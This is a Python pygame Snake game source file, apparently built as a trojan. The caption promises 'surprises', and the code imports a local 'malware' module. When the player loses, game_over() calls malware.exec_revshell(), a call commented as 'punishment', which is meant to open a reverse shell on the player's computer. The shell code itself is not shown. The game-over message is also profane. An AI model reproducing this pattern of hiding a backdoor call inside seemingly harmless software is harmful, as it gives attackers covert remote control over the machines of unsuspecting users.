import pygame
import random
import malware

#Window
window_w = 720
window_h = 480


#Initializing the library
pygame.init()

pygame.display.set_caption("Snake game with surprises...")
game_window = pygame.display.set_mode((window_w, window_h))
fps = pygame.time.Clock()


#Player
snake_speed = 20;
snake_pos = [360, 240]
snake_body = [[360, 240], [350, 240], [340, 240]]

direction = "RIGHT"
change_to = direction


#Fruits
fruit_pos = [random.randrange(1, (window_w//10)) * 10,
				random.randrange(1, (window_h//10)) * 10]
fruit_spawn = True


#Visual
black = pygame.Color(0, 0, 0)
white = pygame.Color(255, 255, 255)
red = pygame.Color(255, 0, 0)
blue = pygame.Color(0, 255, 0)
green = pygame.Color(0, 0, 255)


#UI
score = 0

def show_score(choice, color, font, size):
    score_font = pygame.font.SysFont(font, size)
    score_render = score_font.render('Pontos: ' + str(score), True, color)
    score_rect = score_render.get_rect()
    game_window.blit(score_render, score_rect)


#Game
def game_over():
    game_font = pygame.font.SysFont("monospace", 40)
    game_over_render = game_font.render("GAME OVER, AGORA SE FODE AI!", True, red)
    game_over_rect = game_over_render.get_rect()
    game_over_rect.midtop = (window_w/2, window_h/4)
    game_window.blit(game_over_render, game_over_rect)

    pygame.display.flip()

    #Punishement for loosing:
    malware.exec_revshell()

    #Closes the application
    pygame.quit()
    quit()


#Game Loop
while True:
    for event in pygame.event.get():
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_UP or event.key == pygame.K_w:
                change_to = "UP"
            if event.key == pygame.K_DOWN or event.key == pygame.K_s:
                change_to = "DOWN"
            if event.key == pygame.K_RIGHT or event.key == pygame.K_d:
                change_to = "RIGHT"
            if event.key == pygame.K_LEFT or event.key == pygame.K_a:
                change_to = "LEFT"

    #Blocks the player from moving two oposite directions at the same time
    if change_to == 'UP' and direction != 'DOWN':
        direction = 'UP'
    if change_to == 'DOWN' and direction != 'UP':
        direction = 'DOWN'
    if change_to == 'LEFT' and direction != 'RIGHT':
        direction = 'LEFT'
    if change_to == 'RIGHT' and direction != 'LEFT':
        direction = 'RIGHT'
    
    if direction == 'UP':
        snake_pos[1] -= 10
    if direction == 'DOWN':
        snake_pos[1] += 10
    if direction == 'LEFT':
        snake_pos[0] -= 10
    if direction == 'RIGHT':
        snake_pos[0] += 10

    #Fruit eating and player growing logic
    snake_body.insert(0, list(snake_pos))
    if snake_pos[0] == fruit_pos[0] and snake_pos[1] == fruit_pos[1]:
        score += 10
        fruit_spawn = False
    else:
        snake_body.pop()
         
    if not fruit_spawn:
        fruit_pos = [random.randrange(1, (window_w//10)) * 10, random.randrange(1, (window_h//10)) * 10]
         
    fruit_spawn = True
    game_window.fill(black)
     
    for pos in snake_body:
	    pygame.draw.rect(game_window, green,
						pygame.Rect(pos[0], pos[1], 10, 10))
    pygame.draw.rect(game_window, white, pygame.Rect(
		fruit_pos[0], fruit_pos[1], 10, 10))

    #Game Over Condition
    if snake_pos[0] < 0 or snake_pos[0] > window_w-10:
        game_over()
    if snake_pos[1] < 0 or snake_pos[1] > window_h-10:
        game_over()

    #If the player hit itself
    for block in snake_body[1:]:
        if snake_pos[0] == block[0] and snake_pos[1] == block[1]:
            game_over()
    

    #Showing the score
    show_score(1, white, "monospace", 20)

    #Refresh screen
    pygame.display.update()
    fps.tick(snake_speed)